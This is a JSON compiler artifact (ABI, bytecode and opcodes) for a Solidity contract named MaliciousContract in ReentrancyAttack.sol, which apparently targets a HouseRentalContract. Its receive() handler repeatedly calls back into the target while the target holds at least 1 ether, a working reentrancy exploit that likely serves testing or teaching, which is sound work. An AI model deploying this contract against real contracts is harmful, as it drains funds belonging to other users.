{"contracts/ReentrancyAttack.sol":{"MaliciousContract":{"abi":[{"inputs":[{"internalType":"address","name":"_targetAddress","type":"address"},{"internalType":"bytes6","name":"_targetContractId","type":"bytes6"},{"internalType":"uint256","name":"_targetRequestIndex","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"attack","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"target","outputs":[{"internalType":"contract HouseRentalContract","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"targetContractId","outputs":[{"internalType":"bytes6","name":"","type":"bytes6"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"targetRequestIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"stateMutability":"payable","type":"receive"}],"evm":{"bytecode":{"linkReferences":{},"object":"60803461009e57601f6102ef38819003918201601f19168301916001600160401b038311848410176100a35780849260609460405283398101031261009e5780516001600160a01b0381169081900361009e5760208201516001600160d01b031992909190838316830361009e5760400151926000549265ffffffffffff60a01b9060301c169216171760005560015560405161023590816100ba8239f35b600080fd5b634e487b7160e01b600052604160045260246000fdfe608060409080825260043610156100ab575b50361561001d57600080fd5b6000805491906001600160a01b038316670de0b6b3a76400008131101561004057005b60015493813b156100a757835163652961e160e11b815260309190911b6001600160d01b03191660048201526024810194909452819084908183816044810103925af191821561009d57505061009257005b61009b906101d5565b005b51903d90823e3d90fd5b8280fd5b600090813560e01c90816351720b41146101ad575080638788491d1461018e5780639e5faafc1461010b5763d4b8399203610011579034610107578160031936011261010757905490516001600160a01b039091168152602090f35b5080fd5b50908160031936011261010757815460015490919083906001600160a01b038416803b156100a757835163652961e160e11b815260309590951b6001600160d01b0319166004860152602485019190915283908183816044810103925af19081156101855750610179575080f35b610182906101d5565b80f35b513d84823e3d90fd5b5090346101075781600319360112610107576020906001549051908152f35b905034610107578160031936011261010757905460301b6001600160d01b0319168152602090f35b67ffffffffffffffff81116101e957604052565b634e487b7160e01b600052604160045260246000fdfea2646970667358221220866ea1f4e301cb1282e26e15d2a210668d9ec1f98df9785f645d48180a04343264736f6c63430008180033","opcodes":"PUSH1 0x80 CALLVALUE PUSH2 0x9E JUMPI PUSH1 0x1F PUSH2 0x2EF CODESIZE DUP2 SWAP1 SUB SWAP2 DUP3 ADD PUSH1 0x1F NOT AND DUP4 ADD SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0x40 SHL SUB DUP4 GT DUP5 DUP5 LT OR PUSH2 0xA3 JUMPI DUP1 DUP5 SWAP3 PUSH1 0x60 SWAP5 PUSH1 0x40 MSTORE DUP4 CODECOPY DUP2 ADD SUB SLT PUSH2 0x9E JUMPI DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND SWAP1 DUP2 SWAP1 SUB PUSH2 0x9E JUMPI PUSH1 0x20 DUP3 ADD MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xD0 SHL SUB NOT SWAP3 SWAP1 SWAP2 SWAP1 DUP4 DUP4 AND DUP4 SUB PUSH2 0x9E JUMPI PUSH1 0x40 ADD MLOAD SWAP3 PUSH1 0x0 SLOAD SWAP3 PUSH6 0xFFFFFFFFFFFF PUSH1 0xA0 SHL SWAP1 PUSH1 0x30 SHR AND SWAP3 AND OR OR PUSH1 0x0 SSTORE PUSH1 0x1 SSTORE PUSH1 0x40 MLOAD PUSH2 0x235 SWAP1 DUP2 PUSH2 0xBA DUP3 CODECOPY RETURN JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT INVALID PUSH1 0x80 PUSH1 0x40 SWAP1 DUP1 DUP3 MSTORE PUSH1 0x4 CALLDATASIZE LT ISZERO PUSH2 0xAB JUMPI JUMPDEST POP CALLDATASIZE ISZERO PUSH2 0x1D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP2 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH8 0xDE0B6B3A7640000 DUP2 BALANCE LT ISZERO PUSH2 0x40 JUMPI STOP JUMPDEST PUSH1 0x1 SLOAD SWAP4 DUP2 EXTCODESIZE ISZERO PUSH2 0xA7 JUMPI DUP4 MLOAD PUSH4 0x652961E1 PUSH1 0xE1 SHL DUP2 MSTORE PUSH1 0x30 SWAP2 SWAP1 SWAP2 SHL PUSH1 0x1 PUSH1 0x1 PUSH1 0xD0 SHL SUB NOT AND PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x24 DUP2 ADD SWAP5 SWAP1 SWAP5 MSTORE DUP2 SWAP1 DUP5 SWAP1 DUP2 DUP4 DUP2 PUSH1 0x44 DUP2 ADD SUB SWAP3 GAS CALL SWAP2 DUP3 ISZERO PUSH2 0x9D JUMPI POP POP PUSH2 0x92 JUMPI STOP JUMPDEST PUSH2 0x9B SWAP1 PUSH2 0x1D5 JUMP JUMPDEST STOP JUMPDEST MLOAD SWAP1 RETURNDATASIZE SWAP1 DUP3 RETURNDATACOPY RETURNDATASIZE SWAP1 REVERT JUMPDEST DUP3 DUP1 REVERT JUMPDEST PUSH1 0x0 SWAP1 DUP2 CALLDATALOAD PUSH1 0xE0 SHR SWAP1 DUP2 PUSH4 0x51720B41 EQ PUSH2 0x1AD JUMPI POP DUP1 PUSH4 0x8788491D EQ PUSH2 0x18E JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x10B JUMPI PUSH4 0xD4B83992 SUB PUSH2 0x11 JUMPI SWAP1 CALLVALUE PUSH2 0x107 JUMPI DUP2 PUSH1 0x3 NOT CALLDATASIZE ADD SLT PUSH2 0x107 JUMPI SWAP1 SLOAD SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 SWAP1 RETURN JUMPDEST POP DUP1 REVERT JUMPDEST POP SWAP1 DUP2 PUSH1 0x3 NOT CALLDATASIZE ADD SLT PUSH2 0x107 JUMPI DUP2 SLOAD PUSH1 0x1 SLOAD SWAP1 SWAP2 SWAP1 DUP4 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND DUP1 EXTCODESIZE ISZERO PUSH2 0xA7 JUMPI DUP4 MLOAD PUSH4 0x652961E1 PUSH1 0xE1 SHL DUP2 MSTORE PUSH1 0x30 SWAP6 SWAP1 SWAP6 SHL PUSH1 0x1 PUSH1 0x1 PUSH1 0xD0 SHL SUB NOT AND PUSH1 0x4 DUP7 ADD MSTORE PUSH1 0x24 DUP6 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP4 SWAP1 DUP2 DUP4 DUP2 PUSH1 0x44 DUP2 ADD SUB SWAP3 GAS CALL SWAP1 DUP2 ISZERO PUSH2 0x185 JUMPI POP PUSH2 0x179 JUMPI POP DUP1 RETURN JUMPDEST PUSH2 0x182 SWAP1 PUSH2 0x1D5 JUMP JUMPDEST DUP1 RETURN JUMPDEST MLOAD RETURNDATASIZE DUP5 DUP3 RETURNDATACOPY RETURNDATASIZE SWAP1 REVERT JUMPDEST POP SWAP1 CALLVALUE PUSH2 0x107 JUMPI DUP2 PUSH1 0x3 NOT CALLDATASIZE ADD SLT PUSH2 0x107 JUMPI PUSH1 0x20 SWAP1 PUSH1 0x1 SLOAD SWAP1 MLOAD SWAP1 DUP2 MSTORE RETURN JUMPDEST SWAP1 POP CALLVALUE PUSH2 0x107 JUMPI DUP2 PUSH1 0x3 NOT CALLDATASIZE ADD SLT PUSH2 0x107 JUMPI SWAP1 SLOAD PUSH1 0x30 SHL PUSH1 0x1 PUSH1 0x1 PUSH1 0xD0 SHL SUB NOT AND DUP2 MSTORE PUSH1 0x20 SWAP1 RETURN JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT PUSH2 0x1E9 JUMPI PUSH1 0x40 MSTORE JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP7 PUSH15 0xA1F4E301CB1282E26E15D2A210668D SWAP15 0xC1 0xF9 DUP14 0xF9 PUSH25 0x5F645D48180A04343264736F6C634300081800330000000000 "},"methodIdentifiers":{"attack()":"9e5faafc","target()":"d4b83992","targetContractId()":"51720b41","targetRequestIndex()":"8788491d"}}}}}